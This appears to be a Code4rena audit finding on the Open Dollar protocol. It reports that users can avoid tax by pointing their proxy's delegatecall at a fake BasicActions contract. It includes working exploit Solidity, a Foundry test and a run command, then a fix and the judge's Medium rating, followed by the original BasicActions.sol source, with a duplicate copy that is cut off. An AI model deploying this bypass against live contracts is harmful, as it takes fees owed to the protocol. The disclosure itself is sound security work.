{
  "Title": "[M-07] Malicious users are able to bypass the Tax payment using making a Fake BasicActions Contract",
  "Content": "\nUsers can interact with the protocol without paying any taxes.\n\n### Proof of Concept\n\nWhenever a user wants to interact with the protocol (E.g: lock collateral, generate debt, repay debt, etc) he/she should make a call to their proxy contract and the proxy contract will make a delegatecall to BasicActions contract. BasicActions contract will calculate and pay the tax on every:\n\n*   \\_generateDebt: [Link to code](https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L103)\n*   \\_repayDebt: [Link to code](https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L130)\n*   \\_lockTokenCollateralAndGenerateDebt: [Link to code](https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L181)\n*   repayAllDebt: [Link to code](https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L290)\n*   repayDebtAndFreeTokenCollateral: [Link to code](https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L356)\n*   repayAllDebtAndFreeTokenCollateral: [Link to code](https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L384)\n\nGiven that this is a delegatecall to BasicActions contract and it can be any other contract, a malicious user will be able to deploy a Fake BasicActions contract that doesn't contain any Tax payment mechanism and simply bypass the Tax payment.\n\nTo test the scenario please make a file named `FakeBasicActions.sol` in this path: `test/nft/anvil` and copy/paste the following contract code that has no Tax payment mechanism in it:\n\n<details>\n\n    // SPDX-License-Identifier: GPL-3.0\n    pragma solidity 0.8.19;\n\n    import {ODSafeManager} from '@contracts/proxies/ODSafeManager.sol';\n    import {ODProxy} from '@contracts/proxies/ODProxy.sol';\n\n    import {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';\n    import {ICoinJoin} from '@interfaces/utils/ICoinJoin.sol';\n    import {ITaxCollector} from '@interfaces/ITaxCollector.sol';\n    import {ICollateralJoin} from '@interfaces/utils/ICollateralJoin.sol';\n    import {IERC20Metadata} from '@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol';\n    import {IBasicActions} from '@interfaces/proxies/actions/IBasicActions.sol';\n\n    import {Math, WAD, RAY, RAD} from '@libraries/Math.sol';\n\n    import {CommonActions} from '@contracts/proxies/actions/CommonActions.sol';\n\n    contract FakeBasicActions {\n       using Math for uint256;\n\n      function lockTokenCollateralAndGenerateDebt(\n        address _manager,\n        address _taxCollector,\n        address _collateralJoin,\n        address _coinJoin,\n        uint256 _safeId,\n        uint256 _collateralAmount,\n        uint256 _deltaWad\n      ) public {\n        address _safeEngine = ODSafeManager(_manager).safeEngine();\n        ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n\n        // Takes token amount from user's wallet and joins into the safeEngine\n        _joinCollateral(_collateralJoin, _safeInfo.safeHandler, _collateralAmount);\n\n        // Locks token amount into the SAFE and generates debt\n        _modifySAFECollateralization(\n          _manager,\n          _safeId,\n          _collateralAmount.toInt(),\n          _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)\n        );\n\n        // Exits and transfers COIN amount to the user's address\n        _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);\n      }\n\n      function generateDebt(\n        address _manager,\n        address _taxCollector,\n        address _coinJoin,\n        uint256 _safeId,\n        uint256 _deltaWad\n      ) public {\n        address _safeEngine = ODSafeManager(_manager).safeEngine();\n        ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n\n        // Generates debt in the SAFE\n        _modifySAFECollateralization(\n          _manager,\n          _safeId,\n          0,\n          _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)\n        );\n\n        // Moves the COIN amount to user's address\n        _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);\n      }\n\n      function _modifySAFECollateralization(\n        address _manager,\n        uint256 _safeId,\n        int256 _deltaCollateral,\n        int256 _deltaDebt\n      ) internal {\n        ODSafeManager(_manager).modifySAFECollateralization(_safeId, _deltaCollateral, _deltaDebt);\n      }\n\n      function _getGeneratedDeltaDebt(\n        address _safeEngine,\n        bytes32 _cType,\n        address _safeHandler,\n        uint256 _deltaWad\n      ) internal view returns (int256 _deltaDebt) {\n        uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n        uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n        // If there was already enough COIN in the safeEngine balance, just exits it without adding more debt\n        if (_coinAmount < _deltaWad * RAY) {\n          // Calculates the needed deltaDebt so together with the existing coins in the safeEngine is enough to exit wad amount of COIN tokens\n          _deltaDebt = ((_deltaWad * RAY - _coinAmount) / _rate).toInt();\n          // This is neeeded due lack of precision. It might need to sum an extra deltaDebt wei (for the given COIN wad amount)\n          _deltaDebt = uint256(_deltaDebt) * _rate < _deltaWad * RAY ? _deltaDebt + 1 : _deltaDebt;\n        }\n      }\n\n      function _collectAndExitCoins(address _manager, address _coinJoin, uint256 _safeId, uint256 _deltaWad) internal {\n        // Moves the COIN amount to proxy's address\n        _transferInternalCoins(_manager, _safeId, address(this), _deltaWad * RAY);\n        // Exits the COIN amount to the user's address\n        _exitSystemCoins(_coinJoin, _deltaWad * RAY);\n      }\n\n      function _transferInternalCoins(address _manager, uint256 _safeId, address _dst, uint256 _rad) internal {\n        ODSafeManager(_manager).transferInternalCoins(_safeId, _dst, _rad);\n      }\n\n      function _exitSystemCoins(address _coinJoin, uint256 _coinsToExit) internal virtual {\n        if (_coinsToExit == 0) return;\n\n        ICoinJoin __coinJoin = ICoinJoin(_coinJoin);\n        ISAFEEngine __safeEngine = __coinJoin.safeEngine();\n\n        if (!__safeEngine.canModifySAFE(address(this), _coinJoin)) {\n          __safeEngine.approveSAFEModification(_coinJoin);\n        }\n\n        // transfer all coins to msg.sender (proxy shouldn't hold any system coins)\n        __coinJoin.exit(msg.sender, _coinsToExit / RAY);\n      }\n\n      function _joinCollateral(address _collateralJoin, address _safe, uint256 _wad) internal {\n        ICollateralJoin __collateralJoin = ICollateralJoin(_collateralJoin);\n        IERC20Metadata _token = __collateralJoin.collateral();\n\n        // Transforms the token amount into ERC20 native decimals\n        uint256 _decimals = _token.decimals();\n        uint256 _wei = _wad / 10 ** (18 - _decimals);\n        if (_wei == 0) return;\n\n        // Gets token from the user's wallet\n        _token.transferFrom(msg.sender, address(this), _wei);\n        // Approves adapter to take the token amount\n        _token.approve(_collateralJoin, _wei);\n        // Joins token collateral into the safeEngine\n        __collateralJoin.join(_safe, _wei);\n      }\n      \n    }\n\n</details>\n\nAnd also make another file called `NinjaTests.t.sol` in this path: `test/nft/anvil` and copy/paste the following test code in it:\n\n<details>\n\n    // SPDX-License-Identifier: GPL-3.0\n    pragma solidity 0.8.19;\n    import 'forge-std/Test.sol';\n    import {AnvilFork} from '@test/nft/anvil/AnvilFork.t.sol';\n    import {WSTETH, ARB, CBETH, RETH, MAGIC} from '@script/GoerliParams.s.sol';\n    import {IERC20} from '@openzeppelin/token/ERC20/IERC20.sol';\n    import {SafeERC20} from '@openzeppelin/token/ERC20/utils/SafeERC20.sol';\n    import {Vault721} from '@contracts/proxies/Vault721.sol';\n    import {IODSafeManager} from '@interfaces/proxies/IODSafeManager.sol';\n    import {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';\n    import {ODSafeManager} from '@contracts/proxies/ODSafeManager.sol';\n    import {ODProxy} from '@contracts/proxies/ODProxy.sol';\n    import {FakeBasicActions} from '@test/nft/anvil/FakeBasicActions.sol';\n\n    contract NinjaTests is AnvilFork {\n      using SafeERC20 for IERC20;\n\n      FakeBasicActions fakeBasicActions;\n\n      function test_setup() public {\n        assertEq(totalVaults, vault721.totalSupply());\n        checkProxyAddress();\n        checkVaultIds();\n      }\n\n      function test_GenerateDebtWithoutTax() public {\n        fakeBasicActions = new FakeBasicActions();\n        address proxy = proxies[1];\n        bytes32 cType = cTypes[1];\n        uint256 vaultId = vaultIds[proxy][cType];\n\n        bytes memory payload = abi.encodeWithSelector(\n          fakeBasicActions.lockTokenCollateralAndGenerateDebt.selector,\n          address(safeManager),\n          address(taxCollector),\n          address(collateralJoin[cType]),\n          address(coinJoin),\n          vaultId,\n          1,\n          0\n        );\n        vm.startPrank(users[1]);\n\n        // Proxy makes a delegatecall to Malicious BasicAction contract and bypasses the TAX payment\n        ODProxy(proxy).execute(address(fakeBasicActions), payload);\n        genDebt(vaultId, 10, proxy);\n        \n        vm.stopPrank();\n\n        IODSafeManager.SAFEData memory sData = safeManager.safeData(vaultId);\n        address safeHandler = sData.safeHandler;\n        ISAFEEngine.SAFE memory SafeEngineData = safeEngine.safes(cType, safeHandler);\n        assertEq(1, SafeEngineData.lockedCollateral);\n        assertEq(10, SafeEngineData.generatedDebt);\n      }\n    }\n\n</details>\n\nTest commands: `forge test --fork-url $ANVIL_RPC --match-test test_GenerateDebtWithoutTax`\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nMove the Tax payment mechanism into ODSafeManager contract. E.g:\n\n```diff\n  function modifySAFECollateralization(\n    uint256 _safe,\n    int256 _deltaCollateral,\n    int256 _deltaDebt\n  ) external safeAllowed(_safe) {\n+   ODSafeManager.SAFEData memory _safeInfo = _safeData[_safe];\n+   ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n    SAFEData memory _sData = _safeData[_safe];\n    ISAFEEngine(safeEngine).modifySAFECollateralization(\n      _sData.collateralType, _sData.safeHandler, _sData.safeHandler, _sData.safeHandler, _deltaCollateral, _deltaDebt\n    );\n    emit ModifySAFECollateralization(msg.sender, _safe, _deltaCollateral, _deltaDebt);\n  }\n```\n\n**[pi0neerpat (OpenDollar) confirmed](https://github.com/code-423n4/2023-10-opendollar-findings/issues/286#issuecomment-1783581168)**\n\n**[MiloTruck (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-opendollar-findings/issues/286#issuecomment-1790469484):**\n > The warden has demonstrated how users can bypass tax collection by interacting with `ODSafeManager` through their own implementation contracts. Since this results in a loss of yield (protocol fees) and not assets (user funds), I believe medium severity is appropriate.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-10-opendollar",
  "Code": [
    {
      "filename": "src/contracts/proxies/actions/BasicActions.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.19;\n\nimport {ODSafeManager} from '@contracts/proxies/ODSafeManager.sol';\nimport {ODProxy} from '@contracts/proxies/ODProxy.sol';\n\nimport {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';\nimport {ICoinJoin} from '@interfaces/utils/ICoinJoin.sol';\nimport {ITaxCollector} from '@interfaces/ITaxCollector.sol';\nimport {ICollateralJoin} from '@interfaces/utils/ICollateralJoin.sol';\nimport {IERC20Metadata} from '@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol';\nimport {IBasicActions} from '@interfaces/proxies/actions/IBasicActions.sol';\n\nimport {Math, WAD, RAY, RAD} from '@libraries/Math.sol';\n\nimport {CommonActions} from '@contracts/proxies/actions/CommonActions.sol';\n\n/**\n * @title  BasicActions\n * @notice This contract defines the actions that can be executed to manage a SAFE\n */\ncontract BasicActions is CommonActions, IBasicActions {\n  using Math for uint256;\n\n  // --- Internal functions ---\n\n  /**\n   * @notice Gets delta debt generated for delta wad (always positive)\n   * @dev    Total SAFE debt minus available safeHandler COIN balance\n   */\n  function _getGeneratedDeltaDebt(\n    address _safeEngine,\n    bytes32 _cType,\n    address _safeHandler,\n    uint256 _deltaWad\n  ) internal view returns (int256 _deltaDebt) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n    // If there was already enough COIN in the safeEngine balance, just exits it without adding more debt\n    if (_coinAmount < _deltaWad * RAY) {\n      // Calculates the needed deltaDebt so together with the existing coins in the safeEngine is enough to exit wad amount of COIN tokens\n      _deltaDebt = ((_deltaWad * RAY - _coinAmount) / _rate).toInt();\n      // This is neeeded due lack of precision. It might need to sum an extra deltaDebt wei (for the given COIN wad amount)\n      _deltaDebt = uint256(_deltaDebt) * _rate < _deltaWad * RAY ? _deltaDebt + 1 : _deltaDebt;\n    }\n  }\n\n  /**\n   * @notice Gets repaid delta debt generated\n   * @dev    The rate adjusted debt of the SAFE\n   */\n  function _getRepaidDeltaDebt(\n    address _safeEngine,\n    bytes32 _cType,\n    address _safeHandler\n  ) internal view returns (int256 _deltaDebt) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _generatedDebt = ISAFEEngine(_safeEngine).safes(_cType, _safeHandler).generatedDebt;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n    // Uses the whole coin balance in the safeEngine to reduce the debt\n    _deltaDebt = (_coinAmount / _rate).toInt();\n    // Checks the calculated deltaDebt is not higher than safe.generatedDebt (total debt), otherwise uses its value\n    _deltaDebt = uint256(_deltaDebt) <= _generatedDebt ? -_deltaDebt : -_generatedDebt.toInt();\n  }\n\n  /**\n   * @notice Gets repaid debt\n   * @dev    The rate adjusted SAFE's debt minus COIN balance available in usr's address\n   */\n  function _getRepaidDebt(\n    address _safeEngine,\n    address _usr,\n    bytes32 _cType,\n    address _safeHandler\n  ) internal view returns (uint256 _deltaWad) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _generatedDebt = ISAFEEngine(_safeEngine).safes(_cType, _safeHandler).generatedDebt;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_usr);\n\n    // Uses the whole coin balance in the safeEngine to reduce the debt\n    uint256 _rad = _generatedDebt * _rate - _coinAmount;\n    // Calculates the equivalent COIN amount\n    _deltaWad = _rad / RAY;\n    // If the rad precision has some dust, it will need to request for 1 extra wad wei\n    _deltaWad = _deltaWad * RAY < _rad ? _deltaWad + 1 : _deltaWad;\n  }\n\n  /**\n   * @notice Generates debt\n   * @dev    Modifies the SAFE collateralization ratio, increasing the debt and sends the COIN amount to the user's address\n   */\n  function _generateDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) internal {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Generates debt in the SAFE\n    _modifySAFECollateralization(\n      _manager,\n      _safeId,\n      0,\n      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)\n    );\n\n    // Moves the COIN amount to user's address\n    _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /**\n   * @notice Repays debt\n   * @dev    Joins COIN amount into the safeEngine and modifies the SAFE collateralization reducing the debt\n   */\n  function _repayDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) internal {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(_coinJoin, _safeInfo.safeHandler, _deltaWad);\n\n    // Paybacks debt to the SAFE\n    _modifySAFECollateralization(\n      _manager, _safeId, 0, _getRepaidDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n  }\n\n  /// @notice Routes the openSAFE call to the ODSafeManager contract\n  function _openSAFE(address _manager, bytes32 _cType, address _usr) internal returns (uint256 _safeId) {\n    _safeId = ODSafeManager(_manager).openSAFE(_cType, _usr);\n  }\n\n  /// @notice Routes the transferCollateral call to the ODSafeManager contract\n  function _transferCollateral(address _manager, uint256 _safeId, address _dst, uint256 _deltaWad) internal {\n    if (_deltaWad == 0) return;\n    ODSafeManager(_manager).transferCollateral(_safeId, _dst, _deltaWad);\n  }\n\n  /// @notice Routes the transferInternalCoins call to the ODSafeManager contract\n  function _transferInternalCoins(address _manager, uint256 _safeId, address _dst, uint256 _rad) internal {\n    ODSafeManager(_manager).transferInternalCoins(_safeId, _dst, _rad);\n  }\n\n  /// @notice Routes the modifySAFECollateralization call to the ODSafeManager contract\n  function _modifySAFECollateralization(\n    address _manager,\n    uint256 _safeId,\n    int256 _deltaCollateral,\n    int256 _deltaDebt\n  ) internal {\n    ODSafeManager(_manager).modifySAFECollateralization(_safeId, _deltaCollateral, _deltaDebt);\n  }\n\n  /**\n   * @notice Joins collateral and exits an amount of COIN\n   */\n  function _lockTokenCollateralAndGenerateDebt(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _collateralAmount,\n    uint256 _deltaWad\n  ) internal {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Takes token amount from user's wallet and joins into the safeEngine\n    _joinCollateral(_collateralJoin, _safeInfo.safeHandler, _collateralAmount);\n\n    // Locks token amount into the SAFE and generates debt\n    _modifySAFECollateralization(\n      _manager,\n      _safeId,\n      _collateralAmount.toInt(),\n      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)\n    );\n\n    // Exits and transfers COIN amount to the user's address\n    _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /**\n   * @notice Transfers an amount of COIN to the proxy address and exits to the user's address\n   */\n  function _collectAndExitCoins(address _manager, address _coinJoin, uint256 _safeId, uint256 _deltaWad) internal {\n    // Moves the COIN amount to proxy's address\n    _transferInternalCoins(_manager, _safeId, address(this), _deltaWad * RAY);\n    // Exits the COIN amount to the user's address\n    _exitSystemCoins(_coinJoin, _deltaWad * RAY);\n  }\n\n  /**\n   * @notice Transfers an amount of collateral to the proxy address and exits collateral tokens to the user\n   */\n  function _collectAndExitCollateral(\n    address _manager,\n    address _collateralJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) internal {\n    // Moves the amount from the SAFE handler to proxy's address\n    _transferCollateral(_manager, _safeId, address(this), _deltaWad);\n    // Exits a rounded down amount of collateral\n    _exitCollateral(_collateralJoin, _deltaWad);\n  }\n\n  // --- Methods ---\n\n  /// @inheritdoc IBasicActions\n  function openSAFE(address _manager, bytes32 _cType, address _usr) external delegateCall returns (uint256 _safeId) {\n    return _openSAFE(_manager, _cType, _usr);\n  }\n\n  /// @inheritdoc IBasicActions\n  function generateDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    _generateDebt(_manager, _taxCollector, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    _repayDebt(_manager, _taxCollector, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function lockTokenCollateral(\n    address _manager,\n    address _collateralJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n\n    // Takes token amount from user's wallet and joins into the safeEngine\n    _joinCollateral(_collateralJoin, _safeInfo.safeHandler, _deltaWad);\n\n    // Locks token amount in the safe\n    _modifySAFECollateralization(_manager, _safeId, _deltaWad.toInt(), 0);\n  }\n\n  /// @inheritdoc IBasicActions\n  function freeTokenCollateral(\n    address _manager,\n    address _collateralJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) external delegateCall {\n    // Unlocks token amount from the SAFE\n    _modifySAFECollateralization(_manager, _safeId, -_deltaWad.toInt(), 0);\n    // Transfers token amount to the user's address\n    _collectAndExitCollateral(_manager, _collateralJoin, _safeId, _deltaWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayAllDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId\n  ) external delegateCall {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    ISAFEEngine.SAFE memory _safeData = ISAFEEngine(_safeEngine).safes(_safeInfo.collateralType, _safeInfo.safeHandler);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(\n      _coinJoin,\n      address(this),\n      _getRepaidDebt(_safeEngine, address(this), _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n\n    // Paybacks debt to the SAFE (allowed because reducing debt of the SAFE)\n    ISAFEEngine(_safeEngine).modifySAFECollateralization({\n      _cType: _safeInfo.collateralType,\n      _safe: _safeInfo.safeHandler,\n      _collateralSource: address(this),\n      _debtDestination: address(this),\n      _deltaCollateral: 0,\n      _deltaDebt: -int256(_safeData.generatedDebt)\n    });\n  }\n\n  /// @inheritdoc IBasicActions\n  function lockTokenCollateralAndGenerateDebt(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safe,\n    uint256 _collateralAmount,\n    uint256 _deltaWad\n  ) external delegateCall {\n    _lockTokenCollateralAndGenerateDebt(\n      _manager, _taxCollector, _collateralJoin, _coinJoin, _safe, _collateralAmount, _deltaWad\n    );\n  }\n\n  /// @inheritdoc IBasicActions\n  function openLockTokenCollateralAndGenerateDebt(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    bytes32 _cType,\n    uint256 _collateralAmount,\n    uint256 _deltaWad\n  ) external delegateCall returns (uint256 _safe) {\n    _safe = _openSAFE(_manager, _cType, address(this));\n\n    _lockTokenCollateralAndGenerateDebt(\n      _manager, _taxCollector, _collateralJoin, _coinJoin, _safe, _collateralAmount, _deltaWad\n    );\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayDebtAndFreeTokenCollateral(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _collateralWad,\n    uint256 _debtWad\n  ) external delegateCall {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(_coinJoin, _safeInfo.safeHandler, _debtWad);\n\n    // Paybacks debt to the SAFE and unlocks token amount from it\n    _modifySAFECollateralization(\n      _manager,\n      _safeId,\n      -_collateralWad.toInt(),\n      _getRepaidDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n\n    // Transfers token amount to the user's address\n    _collectAndExitCollateral(_manager, _collateralJoin, _safeId, _collateralWad);\n  }\n\n  /// @inheritdoc IBasicActions\n  function repayAllDebtAndFreeTokenCollateral(\n    address _manager,\n    address _taxCollector,\n    address _collateralJoin,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _collateralWad\n  ) external delegateCall {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    ISAFEEngine.SAFE memory _safeData = ISAFEEngine(_safeEngine).safes(_safeInfo.collateralType, _safeInfo.safeHandler);\n\n    // Joins COIN amount into the safeEngine\n    _joinSystemCoins(\n      _coinJoin,\n      _safeInfo.safeHandler,\n      _getRepaidDebt(_safeEngine, _safeInfo.safeHandler, _safeInfo.collateralType, _safeInfo.safeHandler)\n    );\n\n    // Paybacks debt to the SAFE and unlocks token amount from it\n    _modifySAFECollateralization(_manager, _safeId, -_collateralWad.toInt(), -_safeData.generatedDebt.toInt());\n\n    // Transfers token amount to the user's address\n    _collectAndExitCollateral(_manager, _collateralJoin, _safeId, _collateralWad);\n  }\n}"
    },
    {
      "filename": "src/contracts/proxies/actions/BasicActions.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.19;\n\nimport {ODSafeManager} from '@contracts/proxies/ODSafeManager.sol';\nimport {ODProxy} from '@contracts/proxies/ODProxy.sol';\n\nimport {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';\nimport {ICoinJoin} from '@interfaces/utils/ICoinJoin.sol';\nimport {ITaxCollector} from '@interfaces/ITaxCollector.sol';\nimport {ICollateralJoin} from '@interfaces/utils/ICollateralJoin.sol';\nimport {IERC20Metadata} from '@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol';\nimport {IBasicActions} from '@interfaces/proxies/actions/IBasicActions.sol';\n\nimport {Math, WAD, RAY, RAD} from '@libraries/Math.sol';\n\nimport {CommonActions} from '@contracts/proxies/actions/CommonActions.sol';\n\n/**\n * @title  BasicActions\n * @notice This contract defines the actions that can be executed to manage a SAFE\n */\ncontract BasicActions is CommonActions, IBasicActions {\n  using Math for uint256;\n\n  // --- Internal functions ---\n\n  /**\n   * @notice Gets delta debt generated for delta wad (always positive)\n   * @dev    Total SAFE debt minus available safeHandler COIN balance\n   */\n  function _getGeneratedDeltaDebt(\n    address _safeEngine,\n    bytes32 _cType,\n    address _safeHandler,\n    uint256 _deltaWad\n  ) internal view returns (int256 _deltaDebt) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n    // If there was already enough COIN in the safeEngine balance, just exits it without adding more debt\n    if (_coinAmount < _deltaWad * RAY) {\n      // Calculates the needed deltaDebt so together with the existing coins in the safeEngine is enough to exit wad amount of COIN tokens\n      _deltaDebt = ((_deltaWad * RAY - _coinAmount) / _rate).toInt();\n      // This is neeeded due lack of precision. It might need to sum an extra deltaDebt wei (for the given COIN wad amount)\n      _deltaDebt = uint256(_deltaDebt) * _rate < _deltaWad * RAY ? _deltaDebt + 1 : _deltaDebt;\n    }\n  }\n\n  /**\n   * @notice Gets repaid delta debt generated\n   * @dev    The rate adjusted debt of the SAFE\n   */\n  function _getRepaidDeltaDebt(\n    address _safeEngine,\n    bytes32 _cType,\n    address _safeHandler\n  ) internal view returns (int256 _deltaDebt) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _generatedDebt = ISAFEEngine(_safeEngine).safes(_cType, _safeHandler).generatedDebt;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);\n\n    // Uses the whole coin balance in the safeEngine to reduce the debt\n    _deltaDebt = (_coinAmount / _rate).toInt();\n    // Checks the calculated deltaDebt is not higher than safe.generatedDebt (total debt), otherwise uses its value\n    _deltaDebt = uint256(_deltaDebt) <= _generatedDebt ? -_deltaDebt : -_generatedDebt.toInt();\n  }\n\n  /**\n   * @notice Gets repaid debt\n   * @dev    The rate adjusted SAFE's debt minus COIN balance available in usr's address\n   */\n  function _getRepaidDebt(\n    address _safeEngine,\n    address _usr,\n    bytes32 _cType,\n    address _safeHandler\n  ) internal view returns (uint256 _deltaWad) {\n    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;\n    uint256 _generatedDebt = ISAFEEngine(_safeEngine).safes(_cType, _safeHandler).generatedDebt;\n    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_usr);\n\n    // Uses the whole coin balance in the safeEngine to reduce the debt\n    uint256 _rad = _generatedDebt * _rate - _coinAmount;\n    // Calculates the equivalent COIN amount\n    _deltaWad = _rad / RAY;\n    // If the rad precision has some dust, it will need to request for 1 extra wad wei\n    _deltaWad = _deltaWad * RAY < _rad ? _deltaWad + 1 : _deltaWad;\n  }\n\n  /**\n   * @notice Generates debt\n   * @dev    Modifies the SAFE collateralization ratio, increasing the debt and sends the COIN amount to the user's address\n   */\n  function _generateDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    uint256 _safeId,\n    uint256 _deltaWad\n  ) internal {\n    address _safeEngine = ODSafeManager(_manager).safeEngine();\n    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);\n    ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);\n\n    // Generates debt in the SAFE\n    _modifySAFECollateralization(\n      _manager,\n      _safeId,\n      0,\n      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)\n    );\n\n    // Moves the COIN amount to user's address\n    _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);\n  }\n\n  /**\n   * @notice Repays debt\n   * @dev    Joins COIN amount into the safeEngine and modifies the SAFE collateralization reducing the debt\n   */\n  function _repayDebt(\n    address _manager,\n    address _taxCollector,\n    address _coinJoin,\n    